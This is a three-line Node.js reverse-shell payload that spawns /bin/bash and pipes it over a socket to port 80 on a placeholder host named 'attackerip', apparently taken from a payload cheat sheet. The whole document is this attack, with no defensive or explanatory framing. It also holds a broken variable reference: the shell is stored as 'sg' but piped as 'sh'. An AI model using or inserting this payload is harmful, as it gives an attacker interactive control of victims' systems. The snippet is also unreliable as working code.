var net = require("net"), sg = require("child_process").exec("/bin/bash")
var client = new net.Socket();
client.connect(80, "attackerip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});